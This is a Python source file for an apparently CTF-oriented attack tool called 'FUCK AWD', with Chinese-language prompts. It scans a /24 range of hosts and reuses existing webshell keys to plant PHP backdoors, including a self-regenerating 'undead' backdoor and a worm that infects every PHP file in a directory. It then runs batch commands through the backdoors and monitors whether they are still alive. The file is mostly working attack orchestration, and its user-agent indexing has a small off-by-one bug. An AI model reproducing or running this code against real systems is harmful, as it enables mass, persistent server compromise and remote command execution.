"""
VERSION: python 3.10.x
TIME: 2023/7/3
AUTHOR: F0R
"""
import re
import requests
import time
import random
from ipcunhuo import ip_live_scan
from color import color_print as color
from defend_module import defense
from moudle import upload_PHPma, conn_Command_Control
ua = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
     "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"
]
rand_num = random.randint(1, len(ua))
header = {}
header["User-Agent:"] = ua[rand_num]

help = """
    ----------------------------------后门木马选择----------------------------------------------------
    输入 0 上传普通后门木马                                                        
    输入 1 上传不死马(隐藏源文件，生成影子文件并周期循环执行后门生成代码)                         
    输入 2 上传蠕虫不死木马(可一键感染当前目录所有的php文件，使得当前php文件变成不死木马)
    --------------------------------------------------------------------------------------------------
                        """
class fuck_Awd():
    def attack_Module(self):
        try:
            echo.print_red("[*] 欢迎使用攻击模块...")
            upload_judgement = str(input('\033[1;32m是否批量上传(C段,Y/y N/n):\033[0m'))
            if upload_judgement == 'Y' or upload_judgement == 'y':
                url_target = str(input("\033[1;32mC段的目标地址(eg:http://127.0.0.* '*'代表C段的位置):\033[0m"))
                ip_live = str(input("\033[1;32m是否探测IP C段存活?(y/n):\033[0m"))
                if ip_live.lower() == "y":
                    url_PHPpath = str(input('\033[1;32m木马路径(eg:/upload/):\033[0m'))
                    url_PHPfile = str(input('\033[1;32m木马路径(eg:a.php):\033[0m'))
                    self.url_method = str(input('\033[1;32m一句话的请求方式(POST/GET):\033[0m'))
                    ip_live_num = str(input('\033[1;32m请输入C段数量:\033[0m'))
                    ip_live_lst = ip_live_scan(str(url_target), str(self.url_method), ip_live_num)
                    php_maKey = str(input('\033[1;32m输入已存在后门木马的key:\033[0m'))
                    ma_method = str(input('\033[1;32m已存在后门木马是否为eval？(y/n):\033[0m'))
                    self.ma_func = str(input('\033[1;32m已存在后门木马是否为system？(y/n):\033[0m'))
                    verb_execution_code = str(input("\033[1;32m是否批量执行语句 (y/n):\033[0m"))
                    echo.print_red(help)
                    sel_ma = int((input("\033[1;32m请输入上传木马类型(0/1/2):\033[0m")))
                    phpfile_Name = str(input("\033[1;32m输入植入后门木马的文件名:\033[0m"))
                    phpfile_Key = str(input("\033[1;32m输入植入后门木马的key:\033[0m"))
                    if verb_execution_code.lower() == "y":
                        execution_code = str(input('\033[1;32m输入批量执行的语句:\033[0m'))
                        for _ in ip_live_lst:
                            upload_PHPma(url=_, method=self.url_method, url_PHPpath=url_PHPpath, phpmaKey=php_maKey, ma_method=ma_method, url_PHPfile=url_PHPfile, verb_execution_code=verb_execution_code, upload_judgement=upload_judgement, execution_code=execution_code, sel_ma=sel_ma, phpfile_Name=phpfile_Name, phpfile_Key=phpfile_Key, ma_func=self.ma_func)

                    elif verb_execution_code.lower() == "n":
                        for _ in ip_live_lst:
                            upload_PHPma(_, self.url_method, url_PHPpath, php_maKey, ma_method, url_PHPfile,
                                         verb_execution_code=verb_execution_code, upload_judgement=upload_judgement, execution_code=None, sel_ma=sel_ma,
                                         phpfile_Name=phpfile_Name, phpfile_Key=phpfile_Key, ma_func=self.ma_func)
                elif ip_live.lower() == "n":
                    url_PHPpath = str(input('\033[1;32m木马路径(eg:/upload/):\033[0m'))
                    url_PHPfile = str(input('\033[1;32m木马路径(eg:a.php):\033[0m'))
                    self.url_method = str(input('\033[1;32m一句话的请求方式(POST/GET):\033[0m'))
                    php_maKey = str(input('\033[1;32m输入已存在后门木马的key:\033[0m'))
                    ma_method = str(input('\033[1;32m已存在后门木马是否为eval？(y/n):\033[0m'))
                    self.ma_func = str(input('\033[1;32m已存在后门木马是否为system？(y/n):\033[0m'))
                    verb_execution_code = str(input("\033[1;32m是否批量执行语句 (y/n):\033[0m"))
                    echo.print_red(help)
                    sel_ma = int((input("\033[1;32m请输入上传木马类型(0/1/2):\033[0m")))
                    phpfile_Name = str(input("\033[1;32m输入植入后门木马的文件名:\033[0m"))
                    phpfile_Key = str(input("\033[1;32m输入植入后门木马的key:\033[0m"))
                    if verb_execution_code.lower() == "y":
                        execution_code = str(input('\033[1;32m输入批量执行的语句:\033[0m'))
                        for _ in range(255):
                            url_targets = url_target.replace("*", str(_))
                            upload_PHPma(url_targets, self.url_method, url_PHPpath, php_maKey, ma_method, url_PHPfile, verb_execution_code, upload_judgement, execution_code, sel_ma, phpfile_Name=phpfile_Name, phpfile_Key=phpfile_Key, ma_func=self.ma_func)
                    elif verb_execution_code.lower() == "n":
                        for _ in range(255):
                            url_targets = url_target.replace("*", str(_))
                            upload_PHPma(url_targets, self.url_method, url_PHPpath, php_maKey, ma_method, url_PHPfile, verb_execution_code, upload_judgement, execution_code=None, sel_ma=None, phpfile_Name=phpfile_Name, phpfile_Key=phpfile_Key, ma_func=self.ma_func)

            elif upload_judgement.lower() == 'n':
                url_target = str(input("目标地址(eg: http://127.0.0.1):\033[0m"))
                url_PHPpath = str(input('\033[1;32m木马路径(eg: /upload/(/index.php可以直接使用/符号即可)):\033[0m'))
                url_PHPfile = str(input('\033[1;32m木马名称(eg: busima.php):\033[0m'))
                self.url_method = str(input('\033[1;32m一句话的请求方式(POST/GET):\033[0m'))
                php_maKey = str(input('\033[1;32m输入已存在后门木马的key:\033[0m'))
                ma_method = str(input('\033[1;32m已存在后门木马是否为eval？(y/n):\033[0m'))
                self.ma_func = str(input('\033[1;32m已存在后门木马是否为system？(y/n):\033[0m'))
                phpfile_Name = str(input("\033[1;32m输入植入后门木马的文件名:\033[0m"))
                phpfile_Key = str(input("\033[1;32m输入植入后门木马的key:\033[0m"))
                upload_PHPma(url_target, self.url_method, url_PHPpath, php_maKey, ma_method, url_PHPfile,  verb_execution_code=None, upload_judgement=upload_judgement, execution_code=None, sel_ma=None, phpfile_Name=phpfile_Name, phpfile_Key=phpfile_Key, ma_func=self.ma_func)
        except:
            echo.print_yellow("\nERROR: EXIT!")

    def troJan_Status_Mon(self):
        try:
            url_method = "post"
            ip_lst = []
            url_lst = []
            stu_lst = ["正常"]
            dit_lst = []
            with open(f"output/success.txt", "r") as outfile:
                lines = outfile.readlines()
                for line in lines:
                    line = line.strip()
                    if line:
                        ip_lst.append(line)
                for url in ip_lst:
                    if "." in url or ":" in url:
                        pattern = r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
                        urls = re.findall(pattern, url)
                        url_lst.append(urls[0])
                        dictionary = dict(zip(urls, stu_lst))
                        dit_lst.append(dictionary)
            if url_method == 'POST' or url_method == 'post':
                while True:
                    try:
                        i = 0
                        for url in url_lst:
                            try:
                                response = requests.post(url, headers=header, verify=False, timeout=2)
                            except:
                                pass
                            if response.status_code == 200:
                                echo.print_Binline("[*] 正在监测木马> {}   状态> {}".format(url, dit_lst[i][url]))
                                i += 1
                                time.sleep(2)
                            else:
                                echo.print_Rinline("[x] 正在监测木马> {}   状态> {}".format(url, "断线"))
                                i += 1
                                time.sleep(2)
                    except:
                        break
            elif url_method.lower() == 'get':
                while True:
                    try:
                        i = 0
                        for url in url_lst:
                            response = requests.get(url, headers=header, verify=False, timeout=2)
                            if response.status_code == 200:
                                echo.print_Binline("[*] 正在监测木马> {}   状态> {}".format(url, dit_lst[i][url]))
                                i += 1
                            else:
                                echo.print_Rinline("[x] 正在监测木马> {}   状态> {}".format(url, "断线"))
                                i += 1
                        time.sleep(2)
                    except:
                        echo.print_yellow("木马监测任务终止!")
                        break
        except:
            pass
    def file_uploadma(self):
        upload_judgement = str(input('\033[1;32m是否批量上传(y/n):\033[0m'))
        if upload_judgement.lower() == 'y':
            url_PHPpath = str(input('\033[1;32m木马路径(eg:/upload/):\033[0m'))
            url_PHPfile = str(input('\033[1;32m木马路径(eg:a.php):\033[0m'))
            self.url_method = str(input('\033[1;32m一句话的请求方式(POST/GET):\033[0m'))
            php_maKey = str(input('\033[1;32m输入已存在后门木马的key:\033[0m'))
            ma_method = str(input('\033[1;32m已存在后门木马是否为eval？(y/n):\033[0m'))
            self.ma_func = str(input('\033[1;32m已存在后门木马是否为system？(y/n):\033[0m'))
            verb_execution_code = str(input("\033[1;32m是否批量执行语句 (y/n):\033[0m"))
            echo.print_red(help)
            sel_ma = int((input("\033[1;32m请输入上传木马类型(0/1/2):\033[0m")))
            phpfile_Name = str(input("\033[1;32m输入植入后门木马的文件名:\033[0m"))
            phpfile_Key = str(input("\033[1;32m输入植入后门木马的key:\033[0m"))
            ip_live_lst = []
            with open(f"output/url.txt", "r") as outfile:
                lines = outfile.readlines()
                for line in lines:
                    line = line.strip()
                    if line:
                        ip_live_lst.append(line)
            if verb_execution_code.lower() == "y":
                execution_code = None
                for _ in ip_live_lst:
                    if "http" not in _:
                        url = "http://" + _
                        upload_PHPma(url=url, method=self.url_method, url_PHPpath=url_PHPpath, phpmaKey=php_maKey,
                                     ma_method=ma_method, url_PHPfile=url_PHPfile,
                                     verb_execution_code=verb_execution_code, upload_judgement=upload_judgement,
                                     execution_code=execution_code, sel_ma=sel_ma, phpfile_Name=phpfile_Name,
                                     phpfile_Key=phpfile_Key, ma_func=self.ma_func)
                    else:
                        upload_PHPma(url=_, method=self.url_method, url_PHPpath=url_PHPpath, phpmaKey=php_maKey,
                                     ma_method=ma_method, url_PHPfile=url_PHPfile,
                                     verb_execution_code=verb_execution_code, upload_judgement=upload_judgement,
                                     execution_code=execution_code, sel_ma=sel_ma, phpfile_Name=phpfile_Name,
                                     phpfile_Key=phpfile_Key, ma_func=self.ma_func)

            elif verb_execution_code.lower() == "n":
                execution_code = str(input("请输入执行命令:"))
                for _ in ip_live_lst:
                    if "http" not in _:
                        url = "http://" + _
                        upload_PHPma(url=url, method=self.url_method, url_PHPpath=url_PHPpath, phpmaKey=php_maKey,
                                     ma_method=ma_method, url_PHPfile=url_PHPfile,
                                     verb_execution_code=verb_execution_code, upload_judgement=upload_judgement,
                                     execution_code=execution_code, sel_ma=sel_ma, phpfile_Name=phpfile_Name,
                                     phpfile_Key=phpfile_Key, ma_func=self.ma_func)
                    else:
                        upload_PHPma(url=_, method=self.url_method, url_PHPpath=url_PHPpath, phpmaKey=php_maKey,
                                     ma_method=ma_method, url_PHPfile=url_PHPfile,
                                     verb_execution_code=verb_execution_code, upload_judgement=upload_judgement,
                                     execution_code=execution_code, sel_ma=sel_ma, phpfile_Name=phpfile_Name,
                                     phpfile_Key=phpfile_Key, ma_func=self.ma_func)
            else:
                print("111")
        elif upload_judgement.lower() == 'n':
            try:
                ip_lst = []
                ip_live_lst = []
                key = str(input("请输入已存在后门key:"))
                command = str(input("请输入执行语句:"))
                selcet = str(input("是否保存执行结果(y/n):"))
                with open(f"output/success.txt", "r") as outfile:
                    lines = outfile.readlines()
                    for line in lines:
                        line = line.strip()
                        if line:
                            ip_lst.append(line)
                for url in ip_lst:
                    if "." in url or ":" in url:
                        pattern = r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
                        urls = re.findall(pattern, url)
                        ip_live_lst.append(urls[0])
                try:
                    for url_exp in ip_live_lst:
                        conn_Command_Control(url_exp, command, key, selcet, self.ma_func)
                except:
                    pass
            except:
                echo.print_yellow("读取文件URL木马连接失败!")
                pass
        else:
            echo.print_yellow("\nERROR: EXIT!")

if __name__ == '__main__':
    echo = color()
    fuck = fuck_Awd()
    st = """
    

_______________ ____________  ____  __.    _____  __      __________    
\_   _____/    |   \_   ___ \|    |/ _|   /  _  \/  \    /  \______ \   
 |    __) |    |   /    \  \/|      <    /  /_\  \   \/\/   /|    |  \  
 |     \  |    |  /\     \___|    |  \  /    |    \        / |    `   \ 
 \___  /  |______/  \______  /____|__ \ \____|__  /\__/\  / /_______  / 
     \/                    \/        \/         \/      \/          \/  

                                Welcome to FUCK AWD V0.5  --By F0R
    """
    echo.print_purple(st)
    module_select = """
    输入 1 进入攻击模块
    输入 2 进入木马状态监测模块(木马植入成功可配合木马状态监测模块，来监测木马存活状态)
    输入 3 进入基于success文件,继续执行语句(可联动攻击模块批量模式，攻击模块批量模式会将成功后门导入success文件)
    输入 4 进入防御模块
    输入 5 退出工具
    """
    while True:
        echo.print_blue(module_select)
        try:
            module_Num = str(input("\033[1;32m请输入模块序号: \033[0m"))
            if module_Num == "1":
                fuck.attack_Module()
            elif module_Num == "2":
                echo.print_yellow("木马监测中...")
                fuck.troJan_Status_Mon()
            elif module_Num == "3":
                fuck.file_uploadma()
            elif module_Num == "4":
                echo.print_blue("欢迎使用防御模块...")
                defense()
            elif module_Num == "5":
                break
            else:
                echo.print_yellow("\n[x] 错误的序列号，请重新选择!")
        except:
            pass
    ex1t = """
           \nThank you for using this tool by F0R. (朱厌安全团队)\n
    """
    echo.print_purple(ex1t)